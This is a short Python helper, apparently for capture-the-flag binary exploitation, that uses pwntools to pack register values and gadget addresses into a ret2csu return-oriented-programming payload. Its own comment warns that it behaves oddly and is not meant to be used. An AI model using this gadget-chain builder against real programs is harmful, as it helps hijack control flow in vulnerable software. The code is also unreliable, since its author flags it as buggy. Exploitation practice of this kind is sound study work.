from pwnlib.util.packing import p64

# this code has some weird behavior, do not use it
class Csu64:
    def __init__(self, addr):
        self.addr = addr
        self.edi = 0
        self.rsi = 0
        self.rdx = 0
        self.rbp = 0
        self.target = 0

    def __bytes__(self, count=1):
        if self.rbp == 0:
            self.rbp = count
        payload = p64(self.addr)
        payload += p64(0) + p64(self.rbp)
        payload += p64(self.edi) + p64(self.rsi)
        payload += p64(self.rdx)
        payload += p64(self.target)
        payload += p64(self.addr - 0x1a)

        return payload

    def __add__(self, src):
        return bytes(self) + bytes(src)
